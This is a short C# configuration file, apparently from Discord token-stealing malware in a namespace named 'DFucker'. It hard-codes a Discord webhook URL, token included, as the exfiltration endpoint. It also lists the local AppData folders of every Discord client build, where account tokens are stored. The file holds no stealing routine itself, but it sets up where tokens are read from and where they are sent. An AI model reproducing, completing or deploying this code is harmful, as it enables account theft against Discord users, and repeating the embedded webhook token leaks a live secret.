using System;
using System.Collections.Generic;

namespace DFucker
{
	internal class Config
	{

		public static string webhookURL = "https://discord.com/api/webhooks/855196496441901066/hbP-J4klV-3Sq29GirbutMos4L6YhGY6hJVPeml0rScv4Rzsm0W5PPVik3Eww_YFnUAN";

		public static Dictionary<string, string> builds = new Dictionary<string, string>{
			{"Discord", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord"},
			{"DiscordStable", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Discord"},
			{"DiscordPTB", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\DiscordPTB"},
			{"DiscordCanary", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\DiscordCanary"},
			{"DiscordDevelopement", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\DiscordDevelopement"}
		};


	}
}
